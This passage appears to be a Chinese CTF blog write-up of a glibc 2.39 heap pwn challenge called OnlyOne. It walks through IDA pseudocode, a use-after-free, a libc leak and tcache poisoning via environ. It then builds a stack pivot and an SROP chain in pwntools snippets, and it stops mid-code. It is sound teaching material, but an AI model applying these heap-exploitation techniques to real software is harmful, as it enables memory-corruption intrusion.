+<h3 id="解题记录：-1"><a href="#解题记录：-1" class="headerlink" title="解题记录："></a>解题记录：</h3><!-- 这是一张图片，ocr 内容为：NEPCTF 2026 题目 20:00:52 积分板 尸队伍管理 X 题目列表 X TETRISJOU... <> T.A.S P.W.N 1547 PTS #139 </> DIFFERENT... HFTTC WHAT'S TH... X X X ONLYONE 搜索名称或者标签 RW-TETRISJOURNEY HINT 392 PTS DOP 32 SOLVES NLYONE 已解出已归档 TETRISJOURNEY考虑付费下载一个比较 附件: ONLYONE.ZIP 不 重要的文件,这个文件在关服前登录 AI 有,是自己APK的素材列表,虽说理论 WHAT'S THE IPC 你可以同时启动的题目服务数量已达上限 可构造,验题用了这个文件下载 1PT,做出后额外支付199PT 文件名 CRYPTO PWN VERSION.DAT ICS 关于EZGAME ONLY ONE CHANCE 师傅们非常抱歉!由于我们在题目上 MISC 线时环境错配,导致EZGAME与 LEAKYRAG两题互通,现在大家可以下 PWN 载LEAKYRAG的附件,解出EXP之后猛攻 锤子 提示 题解 <终端 EZGAME. 200 PTS DIFFERENT_ROP 欢迎使用RX::SHEL1! 赛事时间延长公告 国8 Q赛 在此终端中直接输入符合格式的 FLAG 即可提交,你可以输入 HELP 来获取更多的使用帮助. 200 PTS SHADOW_SIGNAL 由于一开始题目资源问题与平台流量 - IN NEPCTF 2026 [23:59:01] 限制造成的服务器崩溃等问题,组委 HFTTCHFTTC:HFTTC ~/ONLYONE - 392 PTS ONLYONE 会决定,比赛时间延长一个小时,即 结束时间为2026.7.19  20:00 625 PTS WHAT'S THE IPC 口这......这是JS? 740 PTS REALWORLD -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784390357090-d65d83f1-99c4-40ab-aba5-16f4aae52073.png"></p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>开完题目后复现的，因此文件中直接包含 exp，无伤大雅，懒得整一个纯净文件了，重新 patch 怪麻烦</p>
+<p>大概说一下从最开始到解出的关键步骤，大部分试错部分就不演示了：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784390862670-f7e3695f-0f13-45c4-a693-89040970bf2d.png"></p>
+<p>依旧看一下防护以及 libc 版本：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784393122416-9980b619-a7ed-4dd2-a0a7-7cf604b02074.png"></p>
+<p>版本给到 2.39，话说最近的比赛基本上都是 2.39 的版本，怎么都这么高啊  T _ T、、</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784393057275-f11075ce-fee2-4e7a-93eb-e78e2138ef79.png"></p>
+<h4 id="IDA-静态分析：-1"><a href="#IDA-静态分析：-1" class="headerlink" title="IDA 静态分析："></a>IDA 静态分析：</h4><h5 id="直接找到-main-函数"><a href="#直接找到-main-函数" class="headerlink" title="直接找到 main 函数"></a>直接找到 main 函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> v4; <span class="comment">// [rsp+3h] [rbp-2Dh] BYREF</span></span><br><span class="line">    <span class="type">__pid_t</span> v5; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">    <span class="type">ssize_t</span> v6; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">    <span class="type">int</span> pipedes[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">    <span class="type">int</span> fd[<span class="number">2</span>]; <span class="comment">// [rsp+18h] [rbp-18h] BYREF</span></span><br><span class="line">    <span class="type">int</span> buf; <span class="comment">// [rsp+22h] [rbp-Eh] BYREF</span></span><br><span class="line">    __int16 v10; <span class="comment">// [rsp+26h] [rbp-Ah]</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v11 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">    buf = <span class="number">0</span>;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">49</span>;</span><br><span class="line">    <span class="keyword">if</span> ( pipe(pipedes) )</span><br><span class="line">        sub_141F(<span class="string">&quot;start pipe failed\n&quot;</span>, a2);</span><br><span class="line">    <span class="keyword">if</span> ( pipe(fd) )</span><br><span class="line">        sub_141F(<span class="string">&quot;notify pipe failed\n&quot;</span>, a2);</span><br><span class="line">    v5 = fork();</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> )</span><br><span class="line">        sub_141F(<span class="string">&quot;fork failed\n&quot;</span>, a2);</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipedes[<span class="number">1</span>]);</span><br><span class="line">        close(fd[<span class="number">0</span>]);</span><br><span class="line">        dword_5010 = fd[<span class="number">1</span>];</span><br><span class="line">        sub_1459(<span class="number">1000</span>, <span class="number">1000</span>);</span><br><span class="line">        sub_24D2((<span class="type">unsigned</span> <span class="type">int</span>)pipedes[<span class="number">0</span>]);</span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(pipedes[<span class="number">0</span>]);</span><br><span class="line">    close(fd[<span class="number">1</span>]);</span><br><span class="line">    sub_1459(<span class="number">1001</span>, <span class="number">1001</span>);</span><br><span class="line">    sub_1784();</span><br><span class="line">    sub_13B9((<span class="type">unsigned</span> <span class="type">int</span>)pipedes[<span class="number">1</span>], &amp;v4, <span class="number">1</span>);</span><br><span class="line">    close(pipedes[<span class="number">1</span>]);</span><br><span class="line">    v6 = read(fd[<span class="number">0</span>], &amp;buf, <span class="number">6u</span>);</span><br><span class="line">    close(fd[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">6</span> &amp;&amp; !<span class="built_in">memcmp</span>(&amp;buf, <span class="string">&quot;Nepnep&quot;</span>, <span class="number">6u</span>) )</span><br><span class="line">        sub_1820(&amp;byte_5120, qword_5220);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        sub_13B9(<span class="number">1</span>, <span class="string">&quot;no flag for you\n&quot;</span>, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>pipe(pipedes) 是 Linux&#x2F;Unix 里的系统调用，用来创建一个匿名管道，常用于父子进程之间通信。</p>
+<p>之后无哦们看一下 sub_141F 这个函数：直接截到一张图里去分析</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784475026928-842b1c8b-cc7b-4145-9958-de63c75a1b33.png"></p>
+<p>v1 &#x3D; strlen(a1)，而 a1 又是 sub_141F 传入的参数，之后 v1 作为参数 a3 传入了 sub_13B9 作为循环数</p>
+<p>那么这里大概就明白了，见过很多这类的，实际上就是循环读入</p>
+<p>我们直接把 sub_141F 改名成 write_0 增加可读性，</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784475568943-fa192e39-3de0-4730-a210-6c70a73e8aa2.png"></p>
+<p>之后敏锐的察觉到这个 49，既然是匿名管道的系统调用，那么去查一下调用号 49 是什么：</p>
+<p>目前的话没什么大用处，先留意一下</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784475630265-acccb1c2-f709-4c89-9aeb-3981cb260c81.png"></p>
+<p>结合上面一小段伪 C 代码来看：</p>
+<ul>
+<li>pipe：成功返回 0，失败返回 -1</li>
+<li>pipe(pipedes)：创建第一个管道，失败就报 start pipe failed</li>
+<li>pipe(fd)：创建第二个管道，失败就报 notify pipe failed</li>
+<li>fork()：创建子进程，失败就报 fork failed</li>
+</ul>
+<p>之后继续往下看：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784476005855-ca827ddd-ea27-44d9-9171-653dac5d2d0c.png"></p>
+<p>if 在父子进程或者 webpwn 之类题目里面，很大一部分都是报错信息，因此这一部分考虑先跳过去，往下看：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784476456221-d3fb1691-1661-4717-8744-01ab82472954.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setgroups(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">setresgid(gid, gid, gid);</span><br><span class="line">setresuid(uid, uid, uid);</span><br></pre></td></tr></table></figure>
+
+<p><code>sub_1459(1001, 1001)</code>：意思是把当前进程切到：uid &#x3D; 1001；gid &#x3D; 1001</p>
+<p>这里有一个切换权限的操作，也就意味着一开始我们的权限并不是 1001，还好给了 dockerfile：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784476820086-94a5a4f4-1257-49e0-8e6b-034f4fef67c5.png"></p>
+<p>也就是在 docker 当中是先以 root 权限操作的，在当中有一个降权的过程</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784476735195-b7606d65-02be-469b-95c3-a6895fc15e4d.png"></p>
+<p>结果最终是通过 sub_1784 把 flag 写到了 byte_5120</p>
+<p>往后看 sub_1820 依旧是一个打印函数</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784477134200-378c660b-2376-4816-99b0-ec40543400a7.png"></p>
+<p>先读 flag，存在内存里，然后等子进程通过管道发 6 字节，只有收到 “Nepnep” 才打印 flag，否则不打印</p>
+<h5 id="没什么发现，再回去看一看-if："><a href="#没什么发现，再回去看一看-if：" class="headerlink" title="没什么发现，再回去看一看 if："></a>没什么发现，再回去看一看 if：</h5><p>后话：哈哈当时确实是这么搞得，没想到 if 里面却是最重要的菜单，前面一开始属于是自作聪明了，之前写过一部分 webpwn，一大堆 if 语句也是分析麻了，后面渐渐就开始跳过 if，结果这次就翻车了，继续分析吧：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784477495306-389da22a-c3c7-44ef-a2ab-47f7d1f0e6f7.png"></p>
+<h5 id="直接分析-sub-14D2"><a href="#直接分析-sub-14D2" class="headerlink" title="直接分析 sub_14D2"></a>直接分析 sub_14D2</h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784477539785-f8ad7a28-712d-43e0-b773-395da3c2e2c1.png"></p>
+<p>直接做一些基础逆向，就少说点吧，前面写那么细感觉有点累还有点累赘：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784477775003-a11ca987-9b13-4b2a-b03a-5c7167f9a545.png"><br>发现开启了沙箱：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784477908123-0a2c3e06-65d8-459a-aeb8-e03cbc5af145.png"></p>
+<p>发现很奇怪，为什么看不了沙箱呢？想了很久不太清楚原因，于是就问了一下 ai，大致解答如下：</p>
+<p><code>seccomp-tools dump</code> 会运行目标程序，目标程序会 fork，父进程读 flag 失败会打印 flag missing，子进程随后继续执行并开启 seccomp，dump 工具要跟到子进程的 prctl(PR_SET_SECCOMP) 才能看到规则。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /priv</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;flag&#123;local_test&#125;&#x27;</span> &gt; /priv/flag.txt</span><br><span class="line"><span class="built_in">chown</span> 1001:1001 /priv/flag.txt</span><br><span class="line"><span class="built_in">chmod</span> 400 /priv/flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>如果本地 &#x2F;priv&#x2F;flag.txt 不存在或权限不对。pwn_patched 的父进程会先执行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_1459(<span class="number">1001</span>, <span class="number">1001</span>);</span><br><span class="line">sub_1784();  <span class="comment">// open(&quot;/priv/flag.txt&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<p>所以本地要有：&#x2F;priv&#x2F;flag.txt，并且要让 uid&#x3D;1001 能读。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784483464198-05b956ed-a7c1-4115-b156-47e0fb8b351f.png"></p>
+<h6 id="add："><a href="#add：" class="headerlink" title="add："></a>add：</h6><p>直接挑关键的信息来：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784478935713-1f179f28-8d97-48ff-adf0-835b5406a513.png"></p>
+<p>add(idx)可以分配一个 0x30 大小 chunk 到 slot[idx]，之后还有一个判断：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_1882(s, s + <span class="number">48</span>, &amp;<span class="built_in">stderr</span>[<span class="number">-2</span>].__pad4, &amp;<span class="built_in">stderr</span>[<span class="number">1</span>])</span><br><span class="line">          || (<span class="type">unsigned</span> <span class="type">int</span>)sub_1882(s, v3, <span class="built_in">stdin</span> - <span class="number">48</span>, <span class="built_in">stdin</span> + <span class="number">216</span>)</span><br><span class="line">          || (<span class="type">unsigned</span> <span class="type">int</span>)sub_1882(s, v3, &amp;<span class="built_in">stdout</span>[<span class="number">-1</span>].__pad3, &amp;<span class="built_in">stdout</span>[<span class="number">1</span>]) )</span><br><span class="line">&#123;</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>判断新分配到的 [s, s+48] 是否落在 stdin&#x2F;stdout&#x2F;stderr 的 FILE 结构附近。如果落进去就退出，防止直接打 _IO_FILE。那么 2.39 不让打 _IO_FILE，这是不是有点？先继续往下看吧</p>
+<h6 id="write："><a href="#write：" class="headerlink" title="write："></a>write：</h6><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784479109621-127d5ac3-5749-4b05-8b46-a5d085da4314.png"></p>
+<p>操作 2 说是 write，实际上就是 edit，可以向一个已分配的 slot 写入 0x30 字节数据</p>
+<h6 id="free："><a href="#free：" class="headerlink" title="free："></a>free：</h6><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784479483362-25a665fb-bfdc-4ad4-8ea1-bd16a9d02b5d.png"></p>
+<p>很明显的 UAF 吧，事实上到这里的话，如果再没有一个 UAF 我可能就直接放弃了，没有 UAF 又不让打 _IO_FILE，在 2.39 这么一个高版本的 glibc 情况下，肯定就是一个非常严苛的漏洞点了</p>
+<p>不过话又说回来了，这不是有 UAF 嘛</p>
+<h6 id="show："><a href="#show：" class="headerlink" title="show："></a>show：</h6><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784479765546-2823b88f-c726-48cd-9fc8-8a4335711997.png"></p>
+<p>只能使用一次的 show，只能直接泄露 slot[idx].ptr 这个指针值</p>
+<h6 id="poke："><a href="#poke：" class="headerlink" title="poke："></a>poke：</h6><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784480021630-55564ad3-e64d-4ec7-9b37-29a9a3ca9d3a.png"></p>
+<p>只能改 freed slot，最多用两次且一次只能修改 8 字节</p>
+<h6 id="trigger："><a href="#trigger：" class="headerlink" title="trigger："></a>trigger：</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( buf == <span class="number">112</span> || buf == <span class="number">100</span> || buf == <span class="number">115</span> || buf == <span class="number">110</span> || v5 == <span class="number">112</span> || v5 == <span class="number">100</span> || v5 == <span class="number">115</span> || v5 == <span class="number">110</span> )</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(&amp;buf, *((_QWORD *)&amp;unk_5060 + <span class="number">3</span> * (<span class="type">int</span>)v2));</span><br><span class="line">write_1(<span class="number">1</span>, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">dword_50F8 = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>主要是这里吧，其实这个函数到后面分析完发现也没什么用处，当时还在这里浪费了一段时间。</p>
+<h5 id="总结一下思路："><a href="#总结一下思路：" class="headerlink" title="总结一下思路："></a>总结一下思路：</h5><p>也就是说我们想要拿到 flag，就必须控制 buf &#x3D; Nepnep</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784524747835-43ce7843-f123-4812-8978-07ab3a89fd16.png"></p>
+<p>看一下 buf，发现是写到栈上的，那么就不难考虑到 environ，environ 是在堆题目当中常用的一种栈泄露手法，如果我们能够寻找到 environ 并控制对应的栈地址，就可以在里面填充 Nepnep 从而绕过判断</p>
+<h3 id="EXP-思路"><a href="#EXP-思路" class="headerlink" title="EXP 思路"></a>EXP 思路</h3><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>打这道题目还是比较麻烦的，要么起一个 docker，要么就要按照 docker 复现一个类似的环境</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784480740129-dfe2c285-7b8c-4e9d-9cc1-69e890c4b8f5.png"></p>
+<p>docker 起了半天没有成功，那就在本地创建几个文件去模拟环境，在此再次强调：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /priv</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;flag&#123;local_test&#125;&#x27;</span> &gt; /priv/flag.txt</span><br><span class="line"><span class="built_in">chown</span> 1001:1001 /priv/flag.txt</span><br><span class="line"><span class="built_in">chmod</span> 400 /priv/flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>如果本地 &#x2F;priv&#x2F;flag.txt 不存在或权限不对。pwn_patched 的父进程会先执行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_1459(<span class="number">1001</span>, <span class="number">1001</span>);</span><br><span class="line">sub_1784();  <span class="comment">// open(&quot;/priv/flag.txt&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<p>所以本地要有：&#x2F;priv&#x2F;flag.txt，并且要让 uid&#x3D;1001 能读。</p>
+<p>留意到前面给了一个 gift，目前并不知道这个是什么意思</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784477908123-0a2c3e06-65d8-459a-aeb8-e03cbc5af145.png?x-oss-process=image/format,webp"></p>
+<p>在新增 &#x2F;priv&#x2F;flag.txt 文件之后依旧可以显示出来，因此我们可以在一开始去泄露这个地址，动调看一看：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784484054863-eea8e571-7d89-4f41-9818-e95218845fe6.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">gift = <span class="built_in">int</span>(io.recvline_contains(<span class="string">b&quot;gift&quot;</span>).split()[-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">f&#x27;gift is <span class="subst">&#123;<span class="built_in">hex</span>(gift)&#125;</span>&#x27;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784484303046-c605c1dd-7611-4adc-95a2-f36e77b5fba7.png"></p>
+<p>发现实际上是 printf 的地址，那么我们就可以直接拿 libc 基地址了，还有这好事？^_^&#x2F;&#x2F;</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc.address = gift - libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc base = %#x&quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784484467133-bcc9def9-5327-468e-9546-474feaec8d3b.png"></p>
+<p>确实可以泄露 libc，没什么问题，那么我们接下来就好受多了</p>
+<h4 id="先打一个-poisoning"><a href="#先打一个-poisoning" class="headerlink" title="先打一个 poisoning"></a>先打一个 poisoning</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(io, <span class="number">0</span>)</span><br><span class="line">delete(io, <span class="number">0</span>)</span><br><span class="line">poke(io, <span class="number">0</span>, libc.sym[<span class="string">&quot;environ&quot;</span>])    </span><br></pre></td></tr></table></figure>
+
+<p>修改第一个 slot 0 的 fd 指针指向 environ，然后利用 environ 去泄露栈地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(io, <span class="number">1</span>)</span><br><span class="line">add(io, <span class="number">2</span>)</span><br><span class="line">add(io, <span class="number">3</span>)</span><br><span class="line">environ = show(io, <span class="number">3</span>)</span><br><span class="line">log.info(<span class="string">&quot;environ is = %#x&quot;</span>, environ)</span><br></pre></td></tr></table></figure>
+
+<p>environ 是一个全局变量，它本身在 libc 里，保存的是指向栈上环境变量数组的指针</p>
+<p>实际上也就是 <code>chunk0 -&gt; libc.environ -&gt; *libc.environ = stack_addr</code>就可以泄露栈地址</p>
+<h4 id="第二次-freelist-posioning"><a href="#第二次-freelist-posioning" class="headerlink" title="第二次 freelist posioning"></a>第二次 freelist posioning</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(io, <span class="number">3</span>)</span><br><span class="line">poke(io, <span class="number">3</span>, stack_addr)</span><br><span class="line">add(io, <span class="number">4</span>)  <span class="comment"># slot[4].ptr = environ</span></span><br><span class="line">add(io, <span class="number">5</span>)  <span class="comment"># slot[5].ptr = stack_addr</span></span><br></pre></td></tr></table></figure>
+
+<p>这里和第一步是一样的，就不多做解释了，这样就可以用 edit 创建两个可写地址</p>
+<p>之后按理来说打一个 ORW 直接去写 flag 即可，像这样：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">    pop_rdi, <span class="number">6</span>,</span><br><span class="line">    pop_rsi, buf,</span><br><span class="line">    pop_rdx, <span class="number">6</span>,</span><br><span class="line">    libc.sym[<span class="string">&quot;write&quot;</span>],</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>不过在这里遇到了一个问题，在寻找 pop_rdx 的时候并没有寻找到一个干净的 pop_rdx_ret：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784532017308-2bf26f0b-17b5-4300-957a-5ac2e87d423e.png"></p>
+<p>这也就意味着我们的 rdx 无法进行传参，与此同时还发现了第二个问题：</p>
+<p>add 本身实际只有 0x30 的大小，上面 write 链实则占用了 0x38 出现了溢出的情况，于是首先应当考虑的是迁移</p>
+<h4 id="栈迁移："><a href="#栈迁移：" class="headerlink" title="栈迁移："></a>栈迁移：</h4><p>那么暂且不考虑 poprdx 的问题，这个肯定是要在后面找东西替代的，既然是替代，其代码量只会多不会少，因此做一个栈迁移是必要的。衍生出两个问题：<strong>1. 迁到哪里？2. 怎么迁移？</strong></p>
+<p>前面利用 posioning 我们构建出了两个可写地址，分别是 environ 和 stack_addr</p>
+<p>利用 stack_addr 当作踏板去执行 rip &#x3D;environ，迁移到 environ，之后我们可以在 environ 中布置 rop 链：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1 = flat(</span><br><span class="line">    pop_rsp,</span><br><span class="line">    environ,</span><br><span class="line">)</span><br><span class="line">edit(io, <span class="number">5</span>, payload1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="SROP："><a href="#SROP：" class="headerlink" title="SROP："></a>SROP：</h4><p>之后开始思考如何构造一个 rop 链，不超过 0x30 大小，也可以绕过 pop_rdx。在学习栈 pwn 的过程中有这么一种手法，适用于在缺少 gadgets 的情况打 ROP 链，当时首要的想法就是打一个 SROP 执行 write：</p>
+<p>触发 SROP 首先要有rt_sigreturn 作为信号返回帧恢复寄存器</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">frame_addr = environ + <span class="number">0x30</span></span><br><span class="line">payload2 = flat(</span><br><span class="line">    pop_rdi,</span><br><span class="line">    frame_addr,</span><br><span class="line">    gets,</span><br><span class="line">    pop_rax,</span><br><span class="line">    constants.SYS_rt_sigreturn,</span><br><span class="line">    syscall,  <span class="comment"># 0x28</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>gets(frame_addr)，执行 rt_sigreturn。所以执行 syscall 后，内核会恢复fake_frame</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784534503924-ce9f4fc5-494e-41ae-8102-eefef74cb804.png"></p>
+<p>这里给了 fd &#x3D; 6，那就按题目给的值走 rdx &#x3D; 6：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">addr = frame_addr + <span class="built_in">len</span>(<span class="built_in">bytes</span>(SigreturnFrame()))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_write</span><br><span class="line">frame.rdi = <span class="number">6</span></span><br><span class="line">frame.rsi = addr</span><br><span class="line">frame.rdx = <span class="number">6</span></span><br><span class="line">frame.rsp 